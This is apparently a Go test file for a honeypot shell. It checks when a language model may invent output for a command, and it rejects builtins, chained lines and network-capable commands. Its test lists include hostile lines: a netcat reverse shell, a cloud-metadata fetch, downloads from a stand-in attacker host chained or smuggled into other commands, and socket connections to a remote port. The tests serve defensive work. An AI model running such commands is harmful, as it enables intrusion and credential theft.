package deception

import "testing"

func TestShouldAttemptCompletionAcceptsUnhandledSimpleCommands(t *testing.T) {
	// Commands the preprint observed in real sessions that the interpreter
	// has no builtin for -- exactly what this fallback exists to serve.
	for _, line := range []string{"uptime", "nproc", "lspci", "nvidia-smi -L", "free -m", "df -h", "lscpu"} {
		name, ok := ShouldAttemptCompletion(line)
		if !ok {
			t.Errorf("ShouldAttemptCompletion(%q) = (_, false), want true", line)
		}
		if name == "" {
			t.Errorf("ShouldAttemptCompletion(%q) returned an empty command name", line)
		}
	}
}

func TestShouldAttemptCompletionRejectsKnownBuiltins(t *testing.T) {
	// These have curated, self-consistent deterministic output; letting a
	// model invent replacements would break consistency with the fake
	// filesystem the rest of the shell renders.
	for _, line := range []string{"ls -la", "cat /etc/passwd", "uname -a", "whoami", "ps aux", "netstat -tulpn"} {
		if _, ok := ShouldAttemptCompletion(line); ok {
			t.Errorf("ShouldAttemptCompletion(%q) = true, want false -- it's a builtin", line)
		}
	}
}

// TestShouldAttemptCompletionRejectsEveryNoEgressTestCommand pins this gate
// directly to internal/shell/no_egress_test.go's command list. Those commands
// must keep resolving to the ordinary command-not-found path (exit 127) with
// no network call of any kind; routing them through an LLM that could invent
// "connection established" output would defeat the guarantee SECURITY.md's
// rules of engagement make, even though no real packet is ever sent.
func TestShouldAttemptCompletionRejectsEveryNoEgressTestCommand(t *testing.T) {
	noEgressCommands := []string{
		"wget http://example.com/a",
		"curl -O http://example.com/b",
		"curl http://169.254.169.254/latest/meta-data/",
		"nc -e /bin/sh 10.0.0.1 4444",
		"ssh user@10.0.0.1",
		"scp file user@10.0.0.1:/tmp",
		"telnet 10.0.0.1 23",
		"ping -c 1 10.0.0.1",
		"nslookup example.com",
		`python3 -c "import socket; socket.create_connection(('10.0.0.1', 4444))"`,
	}
	for _, line := range noEgressCommands {
		if _, ok := ShouldAttemptCompletion(line); ok {
			t.Errorf("ShouldAttemptCompletion(%q) = true, want false -- no-egress command list", line)
		}
	}
}

func TestShouldAttemptCompletionRejectsCompoundLines(t *testing.T) {
	// A completion replaces the whole line's output, so it may only ever be
	// attempted for a single simple command. Anything with chaining, pipes,
	// redirects, substitution or backgrounding goes to the real interpreter,
	// which knows how to evaluate each stage (and how to deny the egress-
	// flavoured ones).
	for _, line := range []string{
		"uptime; wget http://evil.example/x",
		"uptime && curl http://evil.example/x",
		"uptime || nc 10.0.0.1 4444",
		"uptime | tee /tmp/out",
		"uptime > /tmp/out",
		"uptime >> /tmp/out",
		"lspci < /dev/null",
		"echo $(wget http://evil.example/x)",
		"uptime & ",
		"nproc `curl http://evil.example/x`",
	} {
		if _, ok := ShouldAttemptCompletion(line); ok {
			t.Errorf("ShouldAttemptCompletion(%q) = true, want false -- compound line", line)
		}
	}
}

func TestShouldAttemptCompletionRejectsEmptyAndWhitespace(t *testing.T) {
	for _, line := range []string{"", "   ", "\t"} {
		if _, ok := ShouldAttemptCompletion(line); ok {
			t.Errorf("ShouldAttemptCompletion(%q) = true, want false", line)
		}
	}
}

func TestShouldAttemptCompletionRejectsInterpretersAndFetchers(t *testing.T) {
	// Not in no_egress_test.go's list, but the same reasoning: each can
	// perform or imply real egress, so fabricating plausible success output
	// for them is out of scope for this feature.
	for _, line := range []string{
		"python -c pass", "perl -e 1", "ruby -e 1", "node -e 1", "php -r 1",
		"apt-get install nginx", "yum install nginx", "pip install requests",
		"npm install left-pad", "git clone https://example.com/r.git",
		"rsync -a a b", "socat - TCP:10.0.0.1:4444", "ftp 10.0.0.1",
		"dig example.com", "host example.com", "traceroute 10.0.0.1",
		"sh -c id", "bash -c id",
	} {
		if _, ok := ShouldAttemptCompletion(line); ok {
			t.Errorf("ShouldAttemptCompletion(%q) = true, want false -- egress-capable", line)
		}
	}
}
